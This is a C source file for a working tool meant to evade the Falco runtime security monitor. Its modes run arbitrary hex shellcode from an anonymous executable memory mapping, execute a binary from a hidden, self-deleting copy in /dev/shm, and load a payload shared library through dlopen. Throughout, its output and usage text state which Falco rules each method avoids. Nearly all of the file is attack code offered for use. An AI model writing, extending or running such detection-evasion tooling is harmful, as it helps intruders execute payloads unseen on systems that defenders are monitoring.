#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <elf.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static void cmd_sc(const char *hexsc)
{

    size_t hexlen = strlen(hexsc);
    if (hexlen % 2 != 0) { fprintf(stderr, "[-] odd hex length\n"); return; }
    size_t sc_len = hexlen / 2;

    uint8_t *sc = malloc(sc_len);
    for (size_t i = 0; i < sc_len; i++) {
        unsigned b; sscanf(hexsc + i * 2, "%02x", &b); sc[i] = (uint8_t)b;
    }

    long pgsz = sysconf(_SC_PAGESIZE);
    size_t map_sz = (sc_len + (size_t)pgsz - 1) & ~((size_t)pgsz - 1);

    void *mem = mmap(NULL, map_sz, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); free(sc); return; }
    memcpy(mem, sc, sc_len);
    free(sc);

    mprotect(mem, map_sz, PROT_READ|PROT_EXEC);

    fprintf(stderr,
        "[*] shellcode @ %p (%zu bytes)\n"
        "[*] no execve → no EXE_FROM_MEMFD → no sched_process_exec\n"
        "[*] Falco sees: mmap + mprotect syscalls (no default rule for this)\n"
        "[*] running...\n", mem, sc_len);
    fflush(stderr);

    __builtin___clear_cache(mem, (char *)mem + sc_len);
    ((void (*)(void))mem)();
    munmap(mem, map_sz);
}

static void cmd_shm_exec(const char *elf_path, char *const extra_argv[])
{

    char dst[256];
    snprintf(dst, sizeof(dst), "/dev/shm/.%s", strrchr(elf_path, '/') ?
             strrchr(elf_path, '/') + 1 : elf_path);

    int src = open(elf_path, O_RDONLY);
    if (src < 0) { perror(elf_path); return; }

    struct stat st;
    fstat(src, &st);

    int dfd = open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0700);
    if (dfd < 0) { perror(dst); close(src); return; }

    off_t off = 0;
    ssize_t rem = st.st_size;
    while (rem > 0) {
        ssize_t n = sendfile(dfd, src, &off, (size_t)rem);
        if (n <= 0) break;
        rem -= n;
    }
    close(src); close(dfd);

    fprintf(stderr,
        "[*] copied to %s (size=%lld)\n"
        "[*] execve from /dev/shm - EXE_FROM_MEMFD = false\n"
        "[*] Falco 'Fileless execution' rule will NOT fire\n"
        "[*] proc.exepath = %s (not memfd:...)\n",
        dst, (long long)st.st_size, dst);

    int n = 0; while (extra_argv && extra_argv[n]) n++;
    char **argv = calloc((size_t)(n + 2), sizeof(char *));
    argv[0] = dst;
    for (int i = 0; i < n; i++) argv[i+1] = extra_argv[i];
    argv[n+1] = NULL;

    pid_t pid = fork();
    if (pid == 0) {
        extern char **environ;
        execve(dst, argv, environ);
        _exit(1);
    }
    free(argv);

    int status;
    waitpid(pid, &status, 0);
    unlink(dst);
    fprintf(stderr, "[*] exited %d; %s removed\n", WEXITSTATUS(status), dst);
}

static void cmd_dlopen(const char *so_path)
{

    fprintf(stderr, "[*] dlopen injection: loading %s into current process\n", so_path);
    fprintf(stderr, "[*] no execve → no EXE_FROM_MEMFD, no sched_process_exec\n");

    void *handle = dlopen(so_path, RTLD_NOW);
    if (!handle) {

        fprintf(stderr, "[!] dlopen failed: %s\n", strerror(errno));
        fprintf(stderr, "[*] note: compile target .so with: gcc -shared -fPIC -o payload.so payload.c\n");
        fprintf(stderr, "[*] the .so constructor runs before this returns\n");
        return;
    }
    fprintf(stderr, "[+] dlopen succeeded - .so constructor executed in this process\n");
    fprintf(stderr, "[*] Falco saw: openat(%s) + mmap events only\n", so_path);
    fprintf(stderr, "[*] no exec events, no EXE_FROM_MEMFD\n");
}

static void cmd_info(void)
{
    char exe[256] = {};
    ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe)-1);
    if (n > 0) exe[n] = '\0';

    printf("[*] this process:\n");
    printf("  /proc/self/exe = %s\n", exe);

    int is_memfd = (strncmp(exe, "/memfd:", 7) == 0);
    printf("  EXE_FROM_MEMFD = %s\n", is_memfd ? "YES (caught by Falco)" : "no");

    if (is_memfd)
        printf("  [!] running from memfd - Falco 'Fileless execution' rule will fire\n"
               "      use 'sc' mode (shellcode, no execve) to avoid this\n");
    else
        printf("  [*] running from real path - memfd rule does NOT apply\n");

    printf("\n[*] summary of what Falco's EXE_FROM_MEMFD rule catches:\n");
    printf("  proc_ghost ghost-elf  → CAUGHT  (fexecve from memfd sets flag)\n");
    printf("  proc_ghost ghost-self → CAUGHT  (same)\n");
    printf("  proc_ghost ghost-sc   → safe    (no execve, flag never set)\n");
    printf("  this tool 'sc'        → safe    (no execve)\n");
    printf("  this tool 'shm-exec'  → safe    (execve from /dev/shm, not memfd)\n");
    printf("  this tool 'dlopen'    → safe    (no execve at all)\n");
    printf("\n[*] rule evasion for ALL exec paths:\n");
    printf("  proc.is_exe_from_memfd is a kernel flag - cannot be forged\n");
    printf("  the only evasion is to NOT call fexecve on a memfd\n");
    printf("  use shellcode-mmap or shm-exec instead\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s info              show this process's exe_flags + bypass summary\n"
            "  %s sc <hex>          execute shellcode in anon mmap (no execve)\n"
            "  %s shm-exec <elf>    copy ELF to /dev/shm + execve (EXE_FROM_MEMFD=false)\n"
            "  %s dlopen <so>       inject shared library into this process (no exec)\n"
            "\nwhat Falco catches:\n"
            "  fexecve(memfd, ...) sets EXE_FROM_MEMFD flag in linux_binprm.\n"
            "  Falco's rule fires on ANY execve where this flag is set.\n"
            "  The memfd name does not matter - the flag is kernel-managed.\n"
            "\nwhat Falco misses:\n"
            "  mmap(PROT_EXEC) without execve (no sched_process_exec event)\n"
            "  execve from /dev/shm or /tmp (EXE_FROM_MEMFD = false)\n"
            "  dlopen of a .so (mmap event, no exec event)\n"
            "\nfor file/network ops without exec: use io_uring_falco\n"
            "requires: nothing for sc; /dev/shm write access for shm-exec\n",
            argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    if      (strcmp(argv[1], "info")     == 0) cmd_info();
    else if (strcmp(argv[1], "sc")       == 0 && argc >= 3) cmd_sc(argv[2]);
    else if (strcmp(argv[1], "shm-exec") == 0 && argc >= 3) cmd_shm_exec(argv[2], argv + 3);
    else if (strcmp(argv[1], "dlopen")   == 0 && argc >= 3) cmd_dlopen(argv[2]);
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
